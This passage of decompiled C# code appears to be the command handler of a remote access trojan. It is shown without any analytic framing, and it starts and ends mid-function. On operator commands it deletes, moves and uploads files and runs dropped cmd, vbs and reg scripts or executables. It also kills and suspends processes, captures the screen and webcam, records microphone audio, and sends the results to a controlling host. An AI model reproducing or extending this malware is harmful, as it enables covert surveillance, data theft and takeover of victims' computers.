								Image val3 = Image.FromFile(text14);
								MemoryStream memoryStream9 = new MemoryStream();
								EncoderParameters val4 = new EncoderParameters(1);
								val4.get_Param()[0] = new EncoderParameter(Encoder.Quality, 40L);
								ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
								Image thumbnailImage = val3.GetThumbnailImage(20, 20, (GetThumbnailImageAbort)null, IntPtr.Zero);
								thumbnailImage.Save((Stream)memoryStream9, encoderInfo, val4);
								string text16 = text11;
								string y3 = Y;
								string[] array38 = new string[5];
								string[] array39 = array38;
								array4 = new object[1];
								object[] array40 = array4;
								CLR = 1;
								array40[0] = 1;
								Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
								string text17 = API.DEB(ref Text);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
								array39[0] = Strings.Replace(text14, text17, "", 1, -1, (CompareMethod)0);
								array38[1] = "*";
								array38[2] = Conversions.ToString(FileSystem.FileLen(text14));
								array38[3] = "*";
								array38[4] = API.FEN(memoryStream9.ToArray());
								string s2 = string.Concat(array38);
								text11 = text16 + y3 + API.ENB(ref s2);
								memoryStream9.Dispose();
								val4.Dispose();
								val3.Dispose();
								num18++;
							}
							catch (Exception ex13)
							{
								ProjectData.SetProjectError(ex13, num4);
								string text18 = text11;
								string y4 = Y;
								array4 = new object[1];
								object[] array41 = array4;
								CLR = 1;
								array41[0] = 1;
								Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
								string text19 = API.DEB(ref Text);
								NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
								string s2 = Strings.Replace(text14, text19, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text14));
								text11 = text18 + y4 + API.ENB(ref s2);
								ProjectData.ClearProjectError();
							}
						}
						else
						{
							string text20 = text11;
							string y5 = Y;
							array4 = new object[1];
							object[] array42 = array4;
							CLR = 1;
							array42[0] = 1;
							Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
							string text21 = API.DEB(ref Text);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
							string s2 = Strings.Replace(text14, text21, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text14));
							text11 = text20 + y5 + API.ENB(ref s2);
						}
					}
					B b12 = MyProject.Forms.B;
					Text = "#9" + text11;
					b12.SEND(ref Text);
					text11 = "";
					break;
				}
				case "#11":
				{
					Er = 6;
					int num15 = array.Length - 1;
					for (int num16 = 1; num16 <= num15; num16++)
					{
						try
						{
							string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num16 }, (string[])null));
							string fileName = API.DEB(ref Text);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num16, Text }, (string[])null, true, false);
							Process.Start(fileName);
						}
						catch (Exception ex12)
						{
							ProjectData.SetProjectError(ex12, num4);
							ProjectData.ClearProjectError();
						}
					}
					break;
				}
				case "#12":
				{
					Er = 6;
					object[] array4 = new object[1];
					object[] array24 = array4;
					int CLR = 1;
					array24[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text8 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					Array array25 = Strings.Split(text8, "\r\n", -1, (CompareMethod)0);
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array25, new object[1] { 3 }, (string[])null), (object)"DIR", false))
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array25, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array25, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array25, new object[1] { 2 }, (string[])null)));
					}
					else
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array25, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array25, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Conversions.ToString(NewLateBinding.LateIndexGet((object)array25, new object[1] { 2 }, (string[])null)));
					}
					break;
				}
				case "#13":
				{
					Er = 6;
					int num8 = array.Length - 1;
					for (int num9 = 1; num9 <= num8; num9++)
					{
						string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num9 }, (string[])null));
						string path5 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num9, Text }, (string[])null, true, false);
						if (Directory.Exists(path5))
						{
							string s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num9 }, (string[])null));
							string path6 = API.DEB(ref s2);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num9, s2 }, (string[])null, true, false);
							Directory.Delete(path6, recursive: true);
						}
						else
						{
							Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num9 }, (string[])null));
							string path7 = API.DEB(ref Text);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num9, Text }, (string[])null, true, false);
							File.Delete(path7);
						}
					}
					break;
				}
				case "#14":
				{
					Er = 6;
					object[] array4 = new object[1];
					object[] array17 = array4;
					int CLR = 1;
					array17[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text6 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					FileSystem.MkDir(text6);
					break;
				}
				case "#15":
				{
					Er = 6;
					int num5 = array.Length - 1;
					for (int j = 1; j <= num5; j++)
					{
						string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { j }, (string[])null));
						string text3 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { j, Text }, (string[])null, true, false);
						Array array14 = Strings.Split(text3, "\r\n", -1, (CompareMethod)0);
						if (Directory.Exists(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array14, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array14, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0)))
						{
							Directory.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array14, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array14, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array14, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array14, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
						else
						{
							File.Move(Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array14, new object[1] { 0 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array14, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0), Strings.Replace(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array14, new object[1] { 2 }, (string[])null), (object)"\\"), NewLateBinding.LateIndexGet((object)array14, new object[1] { 1 }, (string[])null))), "\\\\", "\\", 1, -1, (CompareMethod)0));
						}
					}
					break;
				}
				case "#16":
				{
					Er = 6;
					B b3 = MyProject.Forms.B;
					string text4 = "#11" + Y;
					object[] array15 = new object[1];
					object[] array16 = array15;
					int CLR = 1;
					array16[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array15, (string[])null));
					string path3 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					string s2 = File.ReadAllText(path3);
					string T = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text4 + API.ENB(ref s2), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)));
					b3.SEND(ref T);
					break;
				}
				case "#17":
				{
					Er = 6;
					object[] array2 = new object[1];
					object[] array12 = array2;
					int CLR = 1;
					array12[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string path2 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					object[] array4 = new object[1];
					object[] array13 = array4;
					int num3 = 2;
					array13[0] = 2;
					string s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string contents = API.DEB(ref s2);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, s2 }, (string[])null, true, false);
					File.WriteAllText(path2, contents);
					break;
				}
				case "#18":
				{
					Er = 6;
					object[] array2 = new object[1];
					object[] array9 = array2;
					int CLR = 1;
					array9[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string path = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					File.Create(path);
					break;
				}
				case "#19":
				{
					Er = 6;
					MemoryStream memoryStream12 = new MemoryStream();
					int num36 = Strings.InStr(@string, Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), (CompareMethod)0) + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length + Y.Length - 1;
					int num37 = Da.Length - 1;
					for (int num38 = num36; num38 <= num37; num38++)
					{
						memoryStream12.WriteByte(Da[num38]);
					}
					object[] array2 = new object[1];
					object[] array78 = array2;
					int CLR = 1;
					array78[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string path16 = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					byte[] b28 = memoryStream12.ToArray();
					bool CM = false;
					File.WriteAllBytes(path16, API.ZIP(b28, ref CM));
					break;
				}
				case "#20":
					break;
				case "#21":
				{
					Er = 6;
					int num34 = array.Length - 1;
					for (int num35 = 1; num35 <= num34; num35++)
					{
						Thread.Sleep(10);
						string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num35 }, (string[])null));
						string text51 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num35, Text }, (string[])null, true, false);
						Image val6 = (Image)new Bitmap(text51);
						val6.Dispose();
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num35 }, (string[])null));
						string text52 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num35, Text }, (string[])null, true, false);
						Array array74 = Strings.Split(text52, "\\", -1, (CompareMethod)0);
						B b27 = MyProject.Forms.B;
						string[] array38 = new string[5] { "#13", Y, null, null, null };
						string[] array75 = array38;
						object[] array4 = new object[1];
						object[] array76 = array4;
						int CLR = array74.Length - 1;
						array76[0] = CLR;
						string s2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array74, array4, (string[])null));
						string text53 = API.ENB(ref s2);
						NewLateBinding.LateIndexSetComplex((object)array74, new object[2] { CLR, s2 }, (string[])null, true, false);
						array75[2] = text53;
						array38[3] = Y;
						string[] array77 = array38;
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num35 }, (string[])null));
						string path15 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { num35, Text }, (string[])null, true, false);
						array77[4] = API.FEN(File.ReadAllBytes(path15));
						string T = string.Concat(array38);
						b27.SEND(ref T);
					}
					break;
				}
				case "#22":
				{
					Er = 1;
					Process[] processes = Process.GetProcesses();
					string text50 = default(string);
					foreach (Process process2 in processes)
					{
						try
						{
							text50 = text50 + Y + process2.MainModule!.ModuleName + "*" + Conversions.ToString(process2.Id);
						}
						catch (Exception ex20)
						{
							ProjectData.SetProjectError(ex20, num4);
							text50 = text50 + Y + process2.ProcessName + "*" + Conversions.ToString(process2.Id);
							ProjectData.ClearProjectError();
						}
					}
					B b24 = MyProject.Forms.B;
					string Text = "#14" + text50;
					b24.SEND(ref Text);
					text50 = "";
					break;
				}
				case "#23":
				{
					Er = 1;
					int num31 = array.Length - 1;
					for (int num32 = 1; num32 <= num31; num32++)
					{
						Process.GetProcessById(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { num32 }, (string[])null))).Kill();
					}
					break;
				}
				case "#24":
				{
					try
					{
						chat.clos = true;
					}
					catch (Exception ex19)
					{
						ProjectData.SetProjectError(ex19, num4);
						ProjectData.ClearProjectError();
					}
					Thread.Sleep(100);
					object[] array2 = new object[1];
					object[] array69 = array2;
					int CLR = 1;
					array69[0] = 1;
					string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					string cht = API.DEB(ref Text);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
					B.Cht = cht;
					break;
				}
				case "#25":
					Er = 0;
					if (((Control)B.Chat).get_InvokeRequired())
					{
						indd indd = inddd;
						object[] array2 = new object[1];
						object[] array60 = array2;
						int CLR = 1;
						array60[0] = 1;
						string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string text39 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
						string text40 = text39;
						((Control)B.Chat).Invoke((Delegate)indd, new object[1] { text40 });
					}
					else
					{
						RichTextBox t = B.Chat.T1;
						string[] array38 = new string[5]
						{
							t.get_Text(),
							MyProject.Forms.chat.nick,
							" : ",
							null,
							null
						};
						string[] array61 = array38;
						object[] array2 = new object[1];
						object[] array62 = array2;
						int CLR = 1;
						array62[0] = 1;
						string Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string text41 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, Text }, (string[])null, true, false);
						array61[3] = text41;
						array38[4] = "\r\n";
						t.set_Text(string.Concat(array38));
					}
					break;
				case "#26":
					Er = 0;
					chat.clos = true;
					break;
				case "#27":
				{
					Er = 1;
					int num26 = 0;
					string s4 = default(string);
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num26), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								FileSystem.Kill(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num26), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								s4 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num26), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
							}
							catch (Exception ex14)
							{
								ProjectData.SetProjectError(ex14, num4);
								ProjectData.ClearProjectError();
								goto IL_2e52;
							}
						}
						else
						{
							s4 = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num26), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						}
						break;
						IL_2e52:
						num26++;
					}
					while (num26 <= 9999);
					string Text;
					switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.ToLower())
					{
					case "cmd":
					{
						string path14 = s4;
						object[] array15 = new object[1];
						object[] array51 = array15;
						int CLR = 2;
						array51[0] = 2;
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array15, (string[])null));
						string contents5 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, Text }, (string[])null, true, false);
						File.WriteAllText(path14, contents5);
						Interaction.Shell(s4, (AppWinStyle)0, false, -1);
						break;
					}
					case "vbs":
					{
						string path13 = s4;
						object[] array2 = new object[1];
						object[] array50 = array2;
						int CLR = 2;
						array50[0] = 2;
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string contents4 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, Text }, (string[])null, true, false);
						File.WriteAllText(path13, contents4);
						Process.Start(s4);
						break;
					}
					case "Reg":
					{
						string path12 = s4;
						object[] array2 = new object[1];
						object[] array49 = array2;
						int CLR = 2;
						array49[0] = 2;
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string contents3 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, Text }, (string[])null, true, false);
						File.WriteAllText(path12, contents3);
						Interaction.Shell(s4, (AppWinStyle)2, false, -1);
						break;
					}
					default:
					{
						string path11 = s4;
						object[] array2 = new object[1];
						object[] array48 = array2;
						int CLR = 2;
						array48[0] = 2;
						Text = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string contents2 = API.DEB(ref Text);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, Text }, (string[])null, true, false);
						File.WriteAllText(path11, contents2);
						Process.Start(s4);
						break;
					}
					}
					B b15 = MyProject.Forms.B;
					Text = "#10" + Y + "^" + Conversions.ToString(4) + Y + API.ENB(ref s4);
					b15.SEND(ref Text);
					break;
				}
				case "#28":
				{
					Er = 1;
					object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj, (object)"!", false))
					{
						B b10 = MyProject.Forms.B;
						string y = Y;
						string Text = "plugin.C";
						string s2 = "W";
						object P = new object[0];
						string T = Conversions.ToString(C.inv(ref C.Plug, ref Text, ref s2, ref P));
						string s = "#17" + y + API.ENB(ref T);
						b10.SEND(ref s);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)"@", false))
					{
						int num13 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
						string Text = "plugin.C";
						string s2 = "CW";
						object[] array4 = new object[2] { num13, null };
						object[] array26 = array4;
						object[] array2 = new object[1];
						object[] array27 = array2;
						int CLR = 3;
						array27[0] = 3;
						string s = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						string text9 = API.DEB(ref s);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, s }, (string[])null, true, false);
						array26[1] = text9;
						object P = array4;
						C.inv(ref C.Plug, ref Text, ref s2, ref P);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)"#", false))
					{
						object[] array2 = new object[1];
						object[] array28 = array2;
						int CLR = 2;
						array28[0] = 2;
						int num3 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						object[] array4 = new object[1];
						object[] array29 = array4;
						int num2 = 3;
						array29[0] = 3;
						int num = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						API.wd.G(ref num3, ref num);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 3, num }, (string[])null, true, false);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, num3 }, (string[])null, true, false);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, (object)"$", false))
					{
						MemoryStream memoryStream8 = new MemoryStream();
						int num = 0;
						object[] array2 = new object[1];
						object[] array30 = array2;
						int num2 = 2;
						array30[0] = 2;
						int CLR = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						byte[] array31 = C.Capture1(ref num, ref CLR);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, CLR }, (string[])null, true, false);
						byte[] array32 = array31;
						memoryStream8.Write(MyProject.Forms.B.WC.STB("#18" + Y), 0, MyProject.Forms.B.WC.STB("#18" + Y).Length);
						memoryStream8.Write(array32, 0, array32.Length);
						MyProject.Forms.B.WC.SendData(memoryStream8.ToArray());
						memoryStream8.Dispose();
					}
					break;
				}
				case "#29":
				{
					Er = 0;
					B b8 = MyProject.Forms.B;
					string s = "#Bla";
					b8.SEND(ref s);
					int num12 = 0;
					string text7 = default(string);
					do
					{
						if (File.Exists(Interaction.Environ("temp") + "\\" + Conversions.ToString(num12) + ".exe"))
						{
							try
							{
								File.Delete(Interaction.Environ("temp") + "\\" + Conversions.ToString(num12) + ".exe");
								text7 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num12) + ".exe";
							}
							catch (Exception ex11)
							{
								ProjectData.SetProjectError(ex11, num4);
								ProjectData.ClearProjectError();
								goto IL_34cd;
							}
						}
						else
						{
							text7 = Interaction.Environ("temp") + "\\" + Conversions.ToString(num12) + ".exe";
						}
						break;
						IL_34cd:
						num12++;
					}
					while (num12 <= 999);
					string path8 = text7;
					byte[] b9 = API.FDE(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					bool CM = false;
					File.WriteAllBytes(path8, API.ZIP(b9, ref CM));
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = text7;
					processStartInfo.Arguments = "!0@" + Application.get_ExecutablePath() + "@" + B.SU + "@" + Conversions.ToString(Process.GetCurrentProcess().Id);
					Process.Start(processStartInfo);
					break;
				}
				case "#30":
					try
					{
						object[] array2 = new object[1];
						object[] array21 = array2;
						int num = 1;
						array21[0] = 1;
						int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
						byte[] array22 = sc.gc(ref num2);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num2 }, (string[])null, true, false);
						byte[] array23 = array22;
						MemoryStream memoryStream7 = new MemoryStream();
						memoryStream7.Write(Encoding.Default.GetBytes("#19" + Y), 0, Encoding.Default.GetBytes("#19" + Y).Length);
						memoryStream7.Write(array23, 0, array23.Length);
						MyProject.Forms.B.WC.SendData(memoryStream7.ToArray());
					}
					catch (Exception ex10)
					{
						ProjectData.SetProjectError(ex10, num4);
						ProjectData.ClearProjectError();
					}
					break;
				case "#31":
				{
					Er = 0;
					if (B.Busy)
					{
						return;
					}
					B.Busy = true;
					B b6 = MyProject.Forms.B;
					string s = "#16" + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width) + Y + Conversions.ToString(((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
					b6.SEND(ref s);
					B.Busy = false;
					break;
				}
				case "#32":
				{
					Er = 0;
					Point position = new Point(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					Cursor.set_Position(position);
					mouse_event(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), 0, 0, 0, 1);
					break;
				}
				case "#33":
				{
					B b5 = MyProject.Forms.B;
					string s = "#5" + Y + API.Gt();
					b5.SEND(ref s);
					break;
				}
				case "#34":
				{
					Er = 0;
					object[] array2 = new object[1];
					object[] array18 = array2;
					int num = 1;
					array18[0] = 1;
					int num2 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
					int CLR = 0;
					byte[] array19 = C.Capture1(ref num2, ref CLR);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num2 }, (string[])null, true, false);
					byte[] array20 = array19;
					if (array20.Length != 0)
					{
						MemoryStream memoryStream5 = new MemoryStream();
						memoryStream5.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream5.Write(array20, 0, array20.Length);
						MyProject.Forms.B.WC.SendData(memoryStream5.ToArray());
					}
					break;
				}
				case "#35":
				{
					int num7 = array.Length - 1;
					for (int n = 1; n <= num7; n++)
					{
						NTSuspendProcess.SuspendProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { n }, (string[])null)));
					}
					break;
				}
				case "#36":
				{
					int num6 = array.Length - 1;
					for (int k = 1; k <= num6; k++)
					{
						NTSuspendProcess.ResumeProcess(Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { k }, (string[])null)));
					}
					break;
				}
				case "#37":
					try
					{
						Cam cam2 = new Cam();
						B b4 = MyProject.Forms.B;
						string text5 = "#22" + Y;
						string s = cam2.Dnames();
						string Text = Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text5 + API.ENB(ref s), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
						b4.SEND(ref Text);
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num4);
						ProjectData.ClearProjectError();
					}
					break;
				case "#38":
				{
					bz = true;
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null), (object)1, false))
					{
						Er = -2;
					}
					Cam cam = new Cam();
					int i = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					Image val = cam.cap(ref i);
					MemoryStream memoryStream3 = new MemoryStream();
					val.Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
					MemoryStream memoryStream4 = new MemoryStream();
					memoryStream4.Write(MyProject.Forms.B.WC.STB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#23" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y))), 0, MyProject.Forms.B.WC.STB(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("#23" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y))).Length);
					memoryStream4.Write(memoryStream3.ToArray(), 0, memoryStream3.ToArray().Length);
					cam.dispose();
					MyProject.Forms.B.WC.SendData(memoryStream4.ToArray());
					break;
				}
				case "#39":
				{
					bool flag = false;
					while (true)
					{
						num4 = 39;
						try
						{
							object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", ""));
							NewLateBinding.LateSet(objectValue, (Type)null, "rate", new object[1] { RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)) }, (string[])null, (Type[])null);
							object[] array4 = new object[1];
							object[] array10 = array4;
							object[] array2 = new object[1];
							object[] array11 = array2;
							int num = 1;
							array11[0] = 1;
							string s = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
							string text2 = API.DEB(ref s);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, s }, (string[])null, true, false);
							array10[0] = text2;
							NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array4, (string[])null, (Type[])null, (bool[])null, true);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex, num4);
							if (!flag)
							{
								flag = true;
								ProjectData.ClearProjectError();
								continue;
							}
							ProjectData.ClearProjectError();
						}
						break;
					}
					break;
				}
				case "#40":
				{
					MemoryStream memoryStream2 = new MemoryStream();
					memoryStream2.Write(Da, NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString()!.Length + Y.Length, Da.Length - (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString()!.Length + Y.Length));
					Audio audio = ((Computer)MyProject.Computer).get_Audio();
					byte[] b2 = memoryStream2.ToArray();
					bool CM = false;
					audio.Play(API.ZIP(b2, ref CM), (AudioPlayMode)1);
					break;
				}
				case "#41":
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"#41", false))
					{
						string s = "open new Type waveaudio Alias recsound";
						string Text = "";
						mciSendStringA(ref s, ref Text, 0, 0);
						s = "record recsound";
						Text = "";
						mciSendStringA(ref s, ref Text, 0, 0);
						Thread.Sleep(5000);
						s = "save recsound " + TM + "rq";
						Text = "";
						mciSendStringA(ref s, ref Text, 0, 0);
						s = "close recsound";
						Text = "";
						mciSendStringA(ref s, ref Text, 0, 0);
						MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(MyProject.Forms.B.WC.STB("#25" + Y), 0, MyProject.Forms.B.WC.STB("#25" + Y).Length);
						byte[] b = File.ReadAllBytes(TM + "rq");
						bool CM = true;
						byte[] array8 = API.ZIP(b, ref CM);
						memoryStream.Write(array8, 0, array8.Length);
						MyProject.Forms.B.WC.SendData(memoryStream.ToArray());
					}
					break;
				case "#42":
				{
					Er = 6;
					UL uL = new UL();
					uL.sock = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					uL.F = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null));
					uL.idx = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null));
					uL.start();
					break;
				}
				case "#43":
				{
					Er = 0;
					object[] array2 = new object[1];
					object[] array3 = array2;
					int num = 1;
					array3[0] = 1;
					string s = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array2, (string[])null));
